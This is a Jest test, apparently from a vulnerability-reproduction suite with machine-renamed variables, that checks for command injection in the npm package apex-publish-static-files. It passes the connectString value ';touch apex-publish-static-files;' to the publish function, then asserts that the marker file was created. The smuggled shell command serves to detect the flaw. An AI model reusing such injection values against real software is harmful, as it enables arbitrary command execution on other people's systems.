const v29 = () => {
    const v16 = expect.assertions(2);
    v16;
    const publisher = require('apex-publish-static-files');
    const fs = require('fs');
    const path = './apex-publish-static-files';
    try {
        const v17 = fs.existsSync(path);
        if (v17) {
            const v18 = fs.unlinkSync(path);
            v18;
            const v19 = console.log('File removed:', path);
            v19;
        }
    } catch (err) {
        const v20 = console.error(err);
        v20;
    }
    file_exist = fs.existsSync(path);
    const v21 = expect(file_exist);
    const v22 = v21.toBe(false);
    v22;
    try {
        const v23 = {
            connectString: ';touch apex-publish-static-files;',
            directory: './',
            appID: 111
        };
        const v24 = publisher.publish(v23);
        v24;
    } catch (err) {
    } finally {
        file_exist = fs.existsSync(path);
        const v25 = expect(file_exist);
        const v26 = v25.toBe(true);
        v26;
        const v27 = function (err) {
        };
        const v28 = fs.unlink(path, v27);
        v28;
    }
};
const v30 = test('Command Injection in apex-publish-static-files', v29);
v30;